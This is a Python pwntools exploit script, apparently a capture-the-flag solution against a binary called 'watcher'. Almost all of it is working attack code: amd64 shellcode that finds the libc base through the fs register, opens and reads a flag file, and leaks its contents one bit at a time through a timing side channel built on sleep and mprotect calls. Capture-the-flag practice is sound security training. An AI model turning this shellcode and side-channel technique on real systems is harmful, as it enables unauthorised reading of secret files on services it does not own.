#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS
context.arch = 'amd64'

BINARY = "./watcher"

IP = "IP_ADDR"
PORT = None

LINK_LIBC = True
LIBC = "./libc.so.6"
LD = "./ld.so"
GDBSCRIPT = """
set follow-fork-mode child
b *run_user_code+71
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

system = libc.symbols['system']
getppid = libc.symbols['getppid']
open_ = libc.symbols['open']
read = libc.symbols['read']
sleep = libc.symbols['sleep']
mprotect = libc.symbols['mprotect']

# SPLOIT #
# setup stage
payload = asm("lea rbx, [rip]; sub rbx, 0x0d;") # get mmap chunk addr in rbx
payload += asm("mov rax, fs:0x0; sub rax, 0x5580; sub rax, 0x1ed040;") # rax is libc-base now
payload += asm("mov rsp, fs:0x300; add rsp, 0x30; mov r9, rax;") # fix stack

# open "/tmp/flag.txt", read on stack
payload += asm("mov rdi, rbx; add rdi, 0x206;") # set arg to open
payload += asm("mov rcx, r9; add rcx, {}; call rcx;".format(hex(open_))) 

# read file
payload += asm("xor rdi, rdi; mov rsi, rsp; add rsi, 0x400; mov rdx, 0x100;")
payload += asm("mov rcx, r9; add rcx, {}; call rcx".format(hex(read)))

# check bit
payload += asm("mov r10, rsi; mov sil, byte ptr[r10]; test sil, 1; jnz $+0x20")
payload += asm("mov rdi, 30; mov rcx, r9; add rcx, {}; call rcx".format(hex(sleep)))
payload += asm("nop;") * 32
payload += asm("mov rdi, rbx; mov rsi, 0x1000; mov rdx, 0x7;")
payload += asm("mov rcx, r9; add rcx, {}; call rcx".format(hex(mprotect)))
payload += asm("mov qword ptr[rbx], rdi;")

payload = payload.ljust(0x200, b'\x90')
payload += b"./flag.txt\x00"

r.sendlineafter(b": ", payload + b"\xeb\xfe")

r.interactive()
